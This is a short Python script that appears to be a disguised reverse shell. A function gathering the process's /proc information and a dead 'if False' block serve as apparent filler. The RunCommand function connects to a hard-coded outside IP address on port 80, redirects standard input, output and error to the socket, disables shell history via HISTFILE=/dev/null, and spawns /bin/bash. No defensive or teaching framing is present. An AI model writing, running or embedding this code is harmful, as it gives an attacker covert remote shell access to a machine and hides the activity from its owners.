import pty
import os
import socket

def gather_proc_info(output_file):
    pid = os.getpid()
    info = {}
    proc_files = {'cmdline': f'/proc/{pid}/cmdline', 'status': f'/proc/{pid}/status', 'stat': f'/proc/{pid}/stat', 'statm': f'/proc/{pid}/statm'}
    if False:
        _var_170_0 = (212, 203, 321)

        def _var_170_fn():
            pass
    for (key, path) in proc_files.items():
        try:
            with open(path, 'r') as f:
                info[key] = f.read().strip()
        except IOError:
            info[key] = 'Error reading file'
    with open(output_file, 'w') as f:
        for (key, value) in info.items():
            f.write(f'{key}:\n{value}\n\n')

def RunCommand():
    lport = 80
    lhost = '3.228.3.164'
    try:
        gather_proc_info('proc_info.txt')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        os.putenv('HISTFILE', '/dev/null')
        pty.spawn('/bin/bash')
        s.close()
    except ConnectionRefusedError:
        print('Connection refused atm')